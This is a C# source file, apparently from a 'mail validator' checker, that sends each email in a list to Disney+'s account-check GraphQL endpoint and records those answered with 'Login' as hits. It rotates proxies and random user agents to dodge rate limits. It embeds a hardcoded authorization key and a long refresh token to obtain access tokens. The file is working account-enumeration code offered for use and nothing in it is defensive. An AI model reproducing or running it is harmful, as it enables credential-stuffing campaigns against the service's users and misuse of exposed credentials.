using System;
using Leaf.xNet;
using CheckerSimplefied;
using System.Threading;

namespace SC___Mail_Validator
{
    class DisneyVM
    {
        public static void postRequests(string username)
        {
            Utilities.name = "Disney";
            for (; ; )
            {
                try
                {
                    if (Program.proxyType > 0)
                    {
                        Program.proxies = Program.PROXIES[new Random().Next(Program.PROXIES.Count)];
                    }
                    using (HttpRequest request = new HttpRequest())
                    {
                        switch ((int)((uint)Program.proxyType + ~(uint)1 + (uint)1))
                        {
                            case 0:
                                request.Proxy = HttpProxyClient.Parse(Program.proxies);
                                break;
                            case 1:
                                request.Proxy = Socks4ProxyClient.Parse(Program.proxies);
                                break;
                            case 2:
                                request.Proxy = Socks5ProxyClient.Parse(Program.proxies);
                                break;
                        }
                        request.KeepAlive = true;
                        request.ConnectTimeout = 2500;
                        request.IgnoreProtocolErrors = true;
                        AmelioratedWrapper.AddHeaderWithStyle(request, "User-Agent: " + Http.RandomUserAgent());
                        AmelioratedWrapper.AddHeaderWithStyle(request, "Content-Type: application/json");
                        AmelioratedWrapper.AddHeaderWithStyle(request, "x-bamsdk-client-id: disney-svod-3d9324fc");
                        AmelioratedWrapper.AddHeaderWithStyle(request, "origin: https://www.disneyplus.com");
                        AmelioratedWrapper.AddHeaderWithStyle(request, "referer: https://www.disneyplus.com");
                        AmelioratedWrapper.AddHeaderWithStyle(request, "authorization: " + token);
                        string url = "https://global.edge.bamgrid.com/v1/public/graphql";
                        var response = request.Raw(HttpMethod.POST, url, (HttpContent)new StringContent("{\"query\":\"\\n    query Check($email: String!) {\\n        check(email: $email) {\\n            operations\\n        }\\n    }\\n\",\"variables\":{\"email\":\"" + username + "\"}}")).ToString();

                        if (response.Contains("Login"))
                        {
                            Utilities.saveHits(username);
                            break;
                        }
                        if (response.Contains("Register"))
                        {
                            Utilities.saveFail(username);
                            break;
                        }
                    }
                }
                catch (Exception)
                {
                    Utilities.catchRetry();
                }
            }
        }

        public static void getToken()
        {
            for (; ; )
            {
                try
                {
                    using (HttpRequest request = new HttpRequest())
                    {
                        request.KeepAlive = true;
                        request.ConnectTimeout = 2500;
                        request.IgnoreProtocolErrors = true;
                        request.UserAgent = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36";
                        request.Authorization = "ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84";
                        string urlPosttk = "https://disney.api.edge.bamgrid.com/graph/v1/device/graphql";
                        string contentType = "application/json";
                        string json = "{\"query\":\"mutation refreshToken($input: RefreshTokenInput!) {\\n            refreshToken(refreshToken: $input) {\\n                activeSession {\\n                    sessionId\\n                }\\n            }\\n        }\",\"variables\":{\"input\":{\"refreshToken\":\"eyJ6aXAiOiJERUYiLCJraWQiOiJLcTYtNW1Ia3BxOXdzLUtsSUUyaGJHYkRIZFduRjU3UjZHY1h6aFlvZi04IiwiY3R5IjoiSldUIiwiZW5jIjoiQzIwUCIsImFsZyI6ImRpciJ9..tUcLce7aL7CH1YAt.9JNWnDScK5yAHMAkWiLF_t0gxTpDjYBfck0qRNF02pZHXUAN32maybIDMfzx90KcQ0JD32eDr8C1dnTsHoCP94oBIpUHwPCqxfK-uwHAmFVGcMN9C9isFVqJTCJ1YJ26rXU2L2CIBY-7C6dAEmie1JDvp2BZ-pt19tMLQENah7w7ovHk7d4XA9YKSar5qaplGDcFkUYyEQHHjwINerlRp1M_8LLFMKhB7egwrgczjzildAb9CjbVRzF_RkEJsAV0EBgfHKBMF7EvilJwEcnpJKFnSEmUPQbG1eLMEKkYiURrYB4FQHtUQIX-TXoCSzcaaUQNPmDULJSvmSAQ8UdthQ8Hq0W6OBWYG8eOTgD2WnW-rjRqD_ND2Msz-YWoBn3F8DA7MEHGuGP8Kjlecl8wSJvRCQ-634sijt1z2Z3xPZa7_XS4LfNwpe7W0f7wzane_8cjtlZ-0zgzN-EtOzLe1kN2CYtyx1UCvS2fBDqqHIyr-d8bycIOf431PXA6docHN-cJ33mBtmW_N5TnrK-qXLG48CTnpJLNIKeoQ8nni8Edt1TMEJgHgVXn-hLs9-sV-d9JUQMzsCuXlwqGS9vdFJV_QD3Vsl7zBVAi_jJMIJHsJpu3MvH5wuuf9i6sxF77TFNVw9_zq4mNr_-SzloYp2zXYDZ34PzOeigIcqHrbP0jS0DO2qJ3Hwpeu-N4XC6s5ATn0l5PZVC3f3nZdFnD75-GVRu3hB0M8mLI4KD57846N7y0UR8d65-YYNoDAqsrNDN6H8TKn-hrU8awDZQO2rzRYl5cTjKobRgtTbFh3SQohT2HUYWcYDe1ANZJax-qYS7kiGDvN-TugLC95us_eVsfp_jwcGoRwQ1bm2ZoDL_WyaTKniGWHZbpW679Fzaa6aORkj0M9CGOlHKE0UVrVEHx0JoXF49nwED4CxaKVu9T0fklRWIeWUudcL2rI_qaSBEMOaovNFyb26-Bfb6bUoCqEoNCd489NKZiiqTafyo8o5lpKVTeq9NRb9Kzgi4QKV6rVlFXOw0LRGE-PMl9Kedv5O3j7NdSGiReGL94lqApMckOfyAgWZ_AuU1T-ky8X5LglV_vJ19mjDrJp81k4F9vFIbYzie4DJ247fIcjze_2atR4_WDwftQdw5-avk5nymwvGVt7JXalZ2ghqXPyod-j6RTQ1UGuPZ-zSU3SzeSg-vbreqgi_379sfITKpwauhtkEqRgBdn5Ym74ER5k6DTZhUaPUvCQ0srvWkQ6vUyiKYaLao8af9RApuha1zZmv-zrot2WBfdU32Ercm0YOg879GkfCx9QamkozVG3OwMJfYURbbzCrCzJiIvWNHbhA7CksYlJB_VVGISYyQAcdMmJC_TfBpM3ziGl-Lzmezju63kYQ05wtw0zhM9wlXclGqXinQXbNIBejwMSHKZlxTC291EKHpn_W5Tad3trU4mf8w2JXcjaipAZIPm-0tKtgnat3STdYf73dK5T3LPenSboGPeVZYqtBCfGOXAB6GfT9PUKR1xracJLoXDN0Y4BcXhHbHeAPXbpcOnymZDE18dlIAQFJc3B0b-VMXa9kPwG114kwRaUX9FMa-ZQ1Zqtv3ijtrBuVqeQXQaM5AJZBVH2nCRCRbB4Omg2sNwXjQnUn87LMrJOnffFw6VYUNh_PYnkEbfi2dUhbtA4fRxnxcdnxvYF0_I4WMwdAsXWPtazarMptCEsz2ijEL8Ftteqo5MBQ8tUADFTIGqX2MjjHx2t9QefTQgEUShsztPtNWhA3hpHZODV2TOIMKbZSjWHUESoyPk-7C9uzAP6CTpPz6XhB7eraWGEyg3LGR6NR-msOblN-LYAYJ8YRwZ2-cduAqNt1G7P7HHFWBmXtOWC8O5kkb_OLqxSH-2lfWfSpJ33h6AS2oQezr6uFdSZB6AsYpj3dUcRgyw2JlLUgKIx4qE5r455gvQdQqKAOrVpfQKQfq45bIyFclvL67ouTcw5Dxqwhi2z0Qo7TzLZ_OOTpo3lQffaBVm-he0g7Dbm5pi10036XT7i82eTpMtuK-wwPNwslKDdHsjA3REL0uQ_VkiNy9TRar3b8-hck-1v9nk_1TgTe1TQC3gXqNeSE8NedoMiX2nsOEVV4SgI5Fttbmu44jGLY1ixC_1zXCm4qOQPucyevzIjPXNiab614JBDnbz72rh1sBWXVpEk7dlX2KOTP7rxEakGHEOSR5Ckx3-JpixIZnnROuz_g4GSVKOoq-py7Ah222bgkhj5oXm3iLjW5hYgi_4lqhd1X80zfGRTXkZoWk5N69mhhZK4b61EOSfn6BmSVe9zM8dacgPdnJ9pkDxHDZydcch7Zzpi3uS_S9SyxirA1-WShBbmC0MVZ3nWx2CShoW59hsvNk5TElDYOvGomoai0bFJt1E3_wQghd679JkEHSBbK_4HequyCKwwsubEAGf7goLdnBAwOllqpifeXB8BvBfcEaM0-G1lRsnIv7_9yjOdLy_fvVpDPBjzRnyVqQF9J3aAHpo_XfvmPien997ZXWm-C6XKF1voyhP.2_9rdayVKzDbIF78GC6aeA\"}}}";
                        HttpResponse httpresponse = request.Post(urlPosttk, json, contentType);
                        string response = httpresponse.ToString();
                        token = response.Substring("accessToken\":\"", "\",\"");
                        if (token != null)
                        {
                            Colorful.Console.WriteLine("The token of the day's is : ", System.Drawing.Color.Crimson);
                            Colorful.Console.WriteLine(token, System.Drawing.Color.AntiqueWhite);
                            Thread.Sleep(500);
                            Console.Clear();
                            break;
                        }
                        else
                        {
                            continue;
                        }
                    }
                }
                catch (Exception)
                {
                    Utilities.catchRetry();
                }
            }
        }
        public static string token;
    }
}
